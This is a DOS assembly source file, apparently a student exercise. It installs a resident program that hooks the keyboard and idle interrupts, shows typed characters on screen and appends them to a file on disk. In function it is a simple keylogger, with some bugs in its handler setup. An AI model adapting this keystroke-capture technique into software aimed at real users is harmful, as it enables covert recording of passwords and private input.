locals @@
.model tiny
.186
.code
org 100h
Start:

.data 

.code
		xor ax, ax; ax = 0
		mov es, ax; es-> PSP

		mov bx, 9 * 4;   es:[bx]-> int 09h in ISP Table
		
		cli
		mov ax, word ptr es:[bx]    
		mov Old09, ax			
		mov ax, word ptr es:[bx+2]
		mov Old09+2, ax
		sti      



		mov dx, offset New09
		call CatchHandler	
		
			
		;xor ax, ax; ax = 0
		;mov es, ax; es-> PSP

		mov bx, 28 * 4
		mov dx, offset New28
		call CatchHandler	



		mov ax, 3100h			; save program to mem
		mov dx, offset EndLabel		; memory size to keep 																			; resident in 16-byte paragraphs
		shr dx, 4			; //16
		inc dx				;
		int 21h				;

;==========================================================================================
;New hendler of 28 interrupt
;==========================================================================================
		
New28		proc
		
		mov al, cs:b_ptr
		mov dl, cs:f_ptr
		cmp al, dl		;b_ptr == f_ptr?
		je Next2
Next1:		
		call WriteToFile
		mov al, cs:b_ptr
		mov dl, cs:f_ptr
		cmp al, dl
		jne Next1
Next2:

		iret
New28		endp	

;==========================================================================================
;New hendler of 9 interrupt
;Destroy: AX, BX, CX, DX, ES, DI
;==========================================================================================
			
New09 		proc

		push ax di es
		mov ax, 0b800h
		mov es, ax				
		
		pushf
		call dword ptr cs:[Old09]       ; call old handler

		
		mov ah, 01h
		int 16h
		
		
						;if (al !=0 && al < 128)
		cmp al, 0
		je Next		
		cmp al, 128
		jae Next



		push bx cx			;save BX, CX
		
		call WritingToBuffer 		;write char to buffer
		
		mov di, (6*80+39)*2
		mov ah, 4eh
		;stosw	
		push ax				;save AX
		
		xor bx, bx			;BX = 0
		mov cx, 256			;CX = 256
		
DrBuf:		   				;Drawing buffer
		mov al, cs:buf[bx]
		stosw		
		inc bx
		loop DrBuf
				
		pop ax
		pop cx bx	
		
Next:
		pop es di ax

		iret
New09		endp


		Old28	dw 0
			dw 0


		Old09	dw 0
			dw 0

;=====================================================================================
;Saves char to buffer
;Entery: 	AL - char to save
;Destroy : 	BX
;=====================================================================================

buf db 256 dup (0)		
b_ptr db 0	
WritingToBuffer	proc
		xor bx, bx			
		mov bl, cs:b_ptr		
		mov byte ptr cs:buf[bx], al	;buf[b_ptr] = AL
		inc bl				;b_ptr++
		mov cs:b_ptr, bl			
		ret
WritingToBuffer	endp

;=====================================================================================
;Write char from "buf" to file
;Entery: 	BX - address of handler
;Destroy : 	AX, CX, BX
;=====================================================================================

CatchHandler	proc
		cli
		mov word ptr es:[bx], dx
		mov ax, cs          
		mov word ptr es:[bx+2], ax	
		sti               
		ret
CatchHandler	endp
;=====================================================================================
;Write char from "buf" to file
;Entery: 	NameOfFile - path to file
;		buf	   - buffer contains data to write
;		b_ptr      - pointer to end of buffer
;		f_ptr      - pointer to next symbol to write
;Destroy : 	AX, DX, CX, BX
;=====================================================================================

NameOfFile: db "W:\FILES\out.txt", 0
f_ptr db 0

WriteToFile	proc
		push cs
		pop ds

		mov ah, 3dh	;open file
		mov al, 1
		mov dx, offset NameOfFile
		int 21h

		mov bx, ax

		mov ah, 42h	;move pointer to the end of the file
		xor cx, cx
		xor dx, dx
		mov al, 2
		int 21h		;position of the end of the file is in AX
					
				;write to file
		mov ah, 40h
		mov cx, 1
		lea dx, buf
		add dl, cs:f_ptr
		int 21h
		
		mov dl, cs:f_ptr
		inc dl
		mov cs:f_ptr, dl		

		mov ah, 3eh	;close file
		int 21h
		ret
WriteToFile	endp


EndLabel:
end Start